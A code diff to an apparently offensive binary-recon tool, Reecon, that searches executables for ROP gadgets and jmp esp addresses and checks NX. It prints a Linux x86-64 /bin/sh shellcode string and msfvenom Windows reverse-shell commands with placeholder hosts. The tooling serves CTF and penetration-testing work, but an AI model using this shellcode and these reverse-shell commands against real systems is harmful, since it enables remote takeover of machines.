@@ -30,8 +30,8 @@ namespace Reecon
                 return;
             }
 
-            Architecture architecture = IDElf(fileName);
-            if (architecture == Architecture.x86)
+            Architecture architecture = IDFile(fileName);
+            if (architecture == Architecture.Linux86)
             {
                 Console.WriteLine("Architecture: x86");
                 // You can get a segfault address of x86 programs by going
@@ -64,14 +64,18 @@ namespace Reecon
                     Console.WriteLine("- pwntools is not installed - Skipping auto segfault");
                 }
             }
-            else if (architecture == Architecture.x64)
+            else if (architecture == Architecture.Linux64)
             {
                 Console.WriteLine("Architecture: x64");
                 // TODO: Find where it segfaults, -1
             }
+            else if (architecture == Architecture.Windows)
+            {
+                Console.WriteLine("File Type: Windows (Unknown Architecture)");
+            }
             else
             {
-                Console.WriteLine("Architecture: Unknown - Can only deal with ELFs");
+                Console.WriteLine("Architecture: Unknown - Bug Reelix to fix this!");
             }
 
             if (General.IsInstalledOnLinux("ropper"))
@@ -87,12 +91,16 @@ namespace Reecon
                         {
                             pwnItem += " -- payload += p64(0x" + pwnItem.Substring(pwnItem.Length - 6, 6) + ")";
                             // 0x16 - x64 address
+                            Console.WriteLine("- ret; (Only function calls) --> " + pwnItem);
+                        }
+                        else if (pwnItem.Length == 10) // x86
+                        {
+                            Console.WriteLine("- ret; (Only function calls) --> " + pwnItem);
                         }
                         else
                         {
-                            Console.WriteLine("Not 18 - " + pwnItem.Length);
+                            Console.WriteLine("Error - Unknown ret length: " + pwnItem.Length);
                         }
-                        Console.WriteLine("- ret; (Only function calls) --> " + pwnItem);
                     }
                 }
 
@@ -101,20 +109,28 @@ namespace Reecon
                 {
                     if (!item.StartsWith("[INFO]") && !item.StartsWith("[LOAD]"))
                     {
-                        string pwnItem = item.Trim(); ;
-                        pwnItem = pwnItem.Replace(": pop rdi; ret;", "");
-                        if (pwnItem.Length == 18)
+                        if (item.Contains(": pop rdi; ret;"))
                         {
-                            pwnItem += " -- payload += p64(0x" + pwnItem.Substring(pwnItem.Length - 6, 6) + ")";
-                            // 0x16 - x64 address
+                            string pwnItem = item.Trim();
+                            pwnItem = pwnItem.Replace(": pop rdi; ret;", "");
+                            if (pwnItem.Length == 18)
+                            {
+                                pwnItem += " -- payload += p64(0x" + pwnItem.Substring(pwnItem.Length - 6, 6) + ")";
+                                // 0x16 - x64 address
+                                Console.WriteLine("- pop rdi; ret; (Can set values) --> " + pwnItem);
+                            }
+                            else
+                            {
+                                Console.WriteLine("Not 18 - " + pwnItem.Length);
+                            }
                         }
                         else
                         {
-                            Console.WriteLine("Not 18 - " + pwnItem.Length);
+                            Console.WriteLine("Unknown prr item: " + item);
                         }
-                        Console.WriteLine("- pop rdi; ret; (Can set values) --> " + pwnItem);
                     }
                 }
+
                 ropperOutput = General.GetProcessOutput("ropper", $"--nocolor --file {fileName} --string \"/bin/sh\"");
                 foreach (string item in ropperOutput)
                 {
@@ -134,40 +150,86 @@ namespace Reecon
                         Console.WriteLine("- /bin/sh --> " + pwnItem);
                     }
                 }
+
+                ropperOutput = General.GetProcessOutput("ropper", $"--nocolor --file {fileName} --search \"jmp esp;\"");
+                foreach (string item in ropperOutput)
+                {
+                    if (!item.StartsWith("[INFO]") && !item.StartsWith("[LOAD]"))
+                    {
+                        if (item.Contains(": jmp esp;"))
+                        {
+                            string pwnItem = item.Trim();
+                            pwnItem = pwnItem.Replace(": jmp esp;", "").Trim();
+                            if (pwnItem.Length == 10 && pwnItem.Substring(0, 2) == "0x")
+                            {
+                                // 0x080414c3 -> 080414c3
+                                string jmpesp = pwnItem.Remove(0, 2);
+                                // 080414c3 -> "\xc3\x14\x04\x08"
+                                jmpesp = string.Format("\\x{0}\\x{1}\\x{2}\\x{3}", jmpesp.Substring(6, 2), jmpesp.Substring(4, 2), jmpesp.Substring(2, 2), jmpesp.Substring(0, 2));
+                                Console.WriteLine("- jmp esp; --> " + pwnItem + " --> " + jmpesp);
+                            }
+                            else
+                            {
+                                Console.WriteLine("Invalud length - Bug Reelix!");
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("Unknown jmp esp Item: " + item);
+                        }
+                    }
+                }
                 // // ropper --file sudo_pwn_file_here --string "/bin/sh"
             }
             else
             {
-                Console.WriteLine("- ropper is not installed - Skipping gadget check and string search");
+                Console.WriteLine("- ropper is not installed (pip install ropper) - Skipping gadget check and string search");
             }
+
             if (General.IsInstalledOnLinux("rabin2"))
             {
                 List<string> rabin2Output = General.GetProcessOutput("rabin2", "-I ./" + fileName);
-                foreach (string item in rabin2Output)
+                if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("nx")).Contains("false"))
                 {
-                    if (item.Trim().StartsWith("nx") && item.Contains("false"))
+                    Console.WriteLine("- nx is disabled - You can run your own shellcode!");
+                    if (architecture == Architecture.Linux64) // bits ?
                     {
-                        Console.WriteLine("- nx is disabled - You can run your own shellcode!");
-                        if (architecture == Architecture.x64)
+                        Console.WriteLine(@"Linux/x86-64 - Execute /bin/sh: \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05");
+                    }
+                    else if (architecture == Architecture.Windows)
+                    {
+                        // -f c = Format (Else it just parses raw bytes instead of showing them)
+                        // -b = Bad characters
+                        if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("bits")).Contains("32"))
                         {
-                            Console.WriteLine(@"Linux/x86-64 - Execute /bin/sh: \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05");
+                            Console.WriteLine("-- Windows - x86 Reverse Shell: msfvenom -p windows/shell_reverse_tcp LHOST=ipHere LPORT=portHere -a x86 --platform windows -f c -b \"\\x00\"");
+                        }
+                        else if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("bits")).Contains("64"))
+                        {
+                            Console.WriteLine("-- Windows - x64 Reverse Shell: msfvenom -p windows/shell_reverse_tcp LHOST=ipHere LPORT=portHere -a x64 --platform windows -f c -b \"\\x00\"");
                         }
                         else
                         {
                             // http://shell-storm.org/shellcode/
-                            Console.WriteLine("Bug Reelix to fix his code!");
+                            Console.WriteLine("Unknown Inner Arch - Bug Reelix to fix his code!");
                         }
                     }
-                    else if (item.Trim().StartsWith("nx") && item.Contains("true"))
+                    else
                     {
-                        Console.WriteLine("- nx is enabled - No custom shellcode for you!");
+                        // http://shell-storm.org/shellcode/
+                        Console.WriteLine("Unknown Outer Arch - Bug Reelix to fix his code!");
                     }
+                }
+                else if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("nx")).Contains("true"))
+                {
+                    Console.WriteLine("nx enabled - No custom shellcode for you!");
                 }
             }
             else
             {
                 Console.WriteLine("- rabin2 is not installed - Skipping nx check");
             }
+
             if (General.IsInstalledOnLinux("objdump"))
             {
                 List<string> objdumpOutput = General.GetProcessOutput("objdump", $"-D {fileName}");
@@ -258,30 +320,40 @@ namespace Reecon
         // 01 (x86) | 02 (x64)
         private enum Architecture
         {
-            x86,
-            x64,
+            Linux86,
+            Linux64,
+            Windows,
             Unknown
         }
 
-        private static Architecture IDElf(string filePath)
+        private static Architecture IDFile(string filePath)
         {
             byte[] headerBytes = new byte[5];
             using (FileStream fileStream = new(filePath, FileMode.Open, FileAccess.Read))
             {
                 fileStream.Read(headerBytes, 0, 5);
             }
-            if (headerBytes[0] != 0x7f || headerBytes[1] != 0x45 || headerBytes[2] != 0x4c || headerBytes[3] != 0x46)
+            // ELF
+            if (headerBytes[0] == 0x7F && headerBytes[1] == 0x45 && headerBytes[2] == 0x4C && headerBytes[3] == 0x46)
             {
-                Console.WriteLine("Not an ELF header");
-                return Architecture.Unknown;
+                if (headerBytes[4] == 0x01)
+                {
+                    return Architecture.Linux86;
+                }
+                else if (headerBytes[4] == 0x02)
+                {
+                    return Architecture.Linux64;
+                }
+                else
+                {
+                    Console.WriteLine("Unknown File Type Identifier");
+                    return Architecture.Unknown;
+                }
             }
-            if (headerBytes[4] == 0x01)
+            // MZ
+            else if (headerBytes[0] == 0x4D && headerBytes[1] == 0x5A)
             {
-                return Architecture.x86;
-            }
-            else if (headerBytes[4] == 0x02)
-            {
-                return Architecture.x64;
+                return Architecture.Windows;
             }
             else
             {
